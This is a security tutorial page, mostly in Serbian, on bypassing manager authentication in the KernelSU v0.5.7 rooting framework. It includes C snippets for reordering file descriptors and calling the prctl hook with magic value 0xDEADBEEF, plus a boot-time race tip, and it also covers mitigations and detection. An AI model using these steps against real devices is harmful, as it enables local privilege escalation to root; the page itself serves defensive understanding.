# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Okvir za rootovanje kao što su KernelSU, APatch, SKRoot i Magisk često zakrpljuju Linux/Android kernel i izlažu privilegovanu funkcionalnost neprivilegovanom korisničkom "menadžer" aplikaciji putem uhvaćenog syscall-a. Ako je korak autentifikacije menadžera neispravan, bilo koja lokalna aplikacija može doći do ovog kanala i eskalirati privilegije na već rootovanim uređajima.

Ova stranica apstrahuje tehnike i zamke otkrivene u javnim istraživanjima (posebno Zimperium-ova analiza KernelSU v0.5.7) kako bi pomogla i crvenim i plavim timovima da razumeju površine napada, primitivne eksploatacije i robusne mitigacije.

---
## Arhitektonski obrazac: syscall-uhvaćen menadžerski kanal

- Kernel modul/zakrpa hvata syscall (obično prctl) da primi "komande" iz korisničkog prostora.
- Protokol obično uključuje: magic_value, command_id, arg_ptr/len ...
- Aplikacija menadžera u korisničkom prostoru prvo se autentifikuje (npr., CMD_BECOME_MANAGER). Kada kernel označi pozivaoca kao pouzdanog menadžera, privilegovane komande se prihvataju:
- Dodeli root pozivaocu (npr., CMD_GRANT_ROOT)
- Upravljaj listama dozvola/zaključavanja za su
- Prilagodi SELinux politiku (npr., CMD_SET_SEPOLICY)
- Upit za verziju/konfiguraciju
- Pošto bilo koja aplikacija može pozvati syscalls, ispravnost autentifikacije menadžera je kritična.

Primer (dizajn KernelSU):
- Uhvaćen syscall: prctl
- Magic vrednost za preusmeravanje na KernelSU handler: 0xDEADBEEF
- Komande uključuju: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, itd.

---
## KernelSU v0.5.7 tok autentifikacije (kako je implementirano)

Kada korisnički prostor pozove prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU proverava:

1) Provera prefiksa putanje
- Pružena putanja mora početi sa očekivanim prefiksom za UID pozivaoca, npr. /data/data/<pkg> ili /data/user/<id>/<pkg>.
- Referenca: core_hook.c (v0.5.7) logika prefiksa putanje.

2) Provera vlasništva
- Putanja mora biti u vlasništvu UID pozivaoca.
- Referenca: core_hook.c (v0.5.7) logika vlasništva.

3) Provera APK potpisa putem skeniranja FD tabele
- Iteriraj otvorene fajl deskriptore (FD) pozivajućeg procesa.
- Izaberi prvi fajl čija putanja odgovara /data/app/*/base.apk.
- Parsiraj APK v2 potpis i verifikuj protiv zvaničnog menadžerskog sertifikata.
- Reference: manager.c (iteriranje FDs), apk_sign.c (APK v2 verifikacija).

Ako sve provere prođu, kernel privremeno kešira UID menadžera i prihvata privilegovane komande od tog UID-a dok se ne resetuje.

---
## Klasa ranjivosti: poveravanje "prvom odgovarajućem APK-u" iz FD iteracije

Ako provera potpisa vezuje za "prvi odgovarajući /data/app/*/base.apk" pronađen u FD tabeli procesa, zapravo ne verifikuje paket pozivaoca. Napadač može unapred postaviti legitimno potpisan APK (pravog menadžera) tako da se pojavi ranije u FD listi od svog vlastitog base.apk.

Ovo poverenje putem indirekcije omogućava neprivilegovanoj aplikaciji da se pretvara da je menadžer bez posedovanja menadžerskog ključa za potpisivanje.

Ključne osobine koje se koriste:
- FD skeniranje se ne vezuje za identitet paketa pozivaoca; samo se podudara sa putanjama.
- open() vraća najniži dostupni FD. Zatvaranjem FD-ova sa nižim brojevima prvo, napadač može kontrolisati redosled.
- Filter samo proverava da li putanja odgovara /data/app/*/base.apk – ne da li odgovara instaliranom paketu pozivaoca.

---
## Preduslovi napada

- Uređaj je već rootovan sa ranjivim okvirom za rootovanje (npr., KernelSU v0.5.7).
- Napadač može pokrenuti proizvoljan neprivilegovan kod lokalno (Android aplikacija).
- Pravi menadžer još nije autentifikovan (npr., odmah nakon ponovnog pokretanja). Neki okviri keširaju UID menadžera nakon uspeha; morate pobediti u trci.

---
## Osnovni koraci eksploatacije (KernelSU v0.5.7)

Visok nivo koraka:
1) Izgradite validnu putanju do svog direktorijuma podataka aplikacije da zadovoljite provere prefiksa i vlasništva.
2) Osigurajte da je pravi KernelSU Manager base.apk otvoren na FD-u sa nižim brojem od vašeg vlastitog base.apk.
3) Pozovite prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) da prođete provere.
4) Izdajte privilegovane komande kao što su CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY da zadržite povišenje.

Praktične napomene o koraku 2 (redosled FD):
- Identifikujte FD vašeg procesa za vaš vlastiti /data/app/*/base.apk tako što ćete proći kroz /proc/self/fd symlinks.
- Zatvorite nizak FD (npr., stdin, fd 0) i prvo otvorite legitimni menadžer APK tako da zauzme fd 0 (ili bilo koji indeks niži od vašeg vlastitog base.apk fd).
- Uključite legitimni menadžer APK sa vašom aplikacijom tako da njegova putanja zadovoljava naivni filter kernela. Na primer, stavite ga pod podputanju koja odgovara /data/app/*/base.apk.

Primer kodnih snimaka (Android/Linux, samo ilustrativno):

Enumerišite otvorene FDs da locirate base.apk unose:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Primorajte da niže numerisani FD usmeri na legitimni manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Upravljanje autentifikacijom putem prctl hook-a:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
After success, privileged commands (examples):
- CMD_GRANT_ROOT: promovisi trenutni proces na root
- CMD_ALLOW_SU: dodajte svoj paket/UID na listu dozvoljenih za trajni su
- CMD_SET_SEPOLICY: prilagodite SELinux politiku prema podršci okvira

Race/persistence tip:
- Registrujte BOOT_COMPLETED receiver u AndroidManifest (RECEIVE_BOOT_COMPLETED) da biste započeli rano nakon ponovnog pokretanja i pokušali autentifikaciju pre pravog menadžera.

---
## Detection and mitigation guidance

For framework developers:
- Povežite autentifikaciju sa paketom/UID pozivaoca, a ne sa proizvoljnim FD-ovima:
- Rešite paket pozivaoca iz njegovog UID-a i verifikujte protiv potpisa instaliranog paketa (putem PackageManager-a) umesto skeniranja FD-ova.
- Ako je samo kernel, koristite stabilni identitet pozivaoca (task creds) i validirajte na stabilnom izvoru istine koji upravlja init/userspace pomoćnikom, a ne procesnim FD-ovima.
- Izbegavajte provere putanje kao identitet; one su trivijalno zadovoljavajuće od strane pozivaoca.
- Koristite nonce-bazirani izazov–odgovor preko kanala i obrišite bilo koji keširani identitet menadžera pri pokretanju ili na ključnim događajima.
- Razmotrite IPC sa autentifikacijom zasnovanom na binderu umesto preopterećenja generičkih syscalls kada je to izvodljivo.

For defenders/blue team:
- Otkrivanje prisustva rooting okvira i procesa menadžera; pratite prctl pozive sa sumnjivim magičnim konstantama (npr., 0xDEADBEEF) ako imate kernel telemetriju.
- Na upravljanim flotama, blokirajte ili upozorite na boot receiver-e iz nepouzdanih paketa koji brzo pokušavaju privilegovane komande menadžera nakon pokretanja.
- Osigurajte da su uređaji ažurirani na zakrpljene verzije okvira; poništite keširane ID-eve menadžera prilikom ažuriranja.

Limitations of the attack:
- Pogađa samo uređaje koji su već rootovani sa ranjivim okvirom.
- Obično zahteva ponovni pokretanje/race prozor pre nego što legitimni menadžer autentifikuje (neki okviri keširaju UID menadžera do resetovanja).

---
## Related notes across frameworks

- Autentifikacija zasnovana na lozinkama (npr., istorijski APatch/SKRoot build-ovi) može biti slaba ako su lozinke pogađane/bruteforce-ovane ili su validacije sa greškama.
- Autentifikacija zasnovana na paketu/potpisu (npr., KernelSU) je jača u principu, ali mora biti povezana sa stvarnim pozivaocem, a ne indirektnim artefaktima poput FD skeniranja.
- Magisk: CVE-2024-48336 (MagiskEoP) je pokazao da čak i zreli ekosistemi mogu biti podložni lažiranju identiteta što dovodi do izvršavanja koda sa root privilegijama unutar konteksta menadžera.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
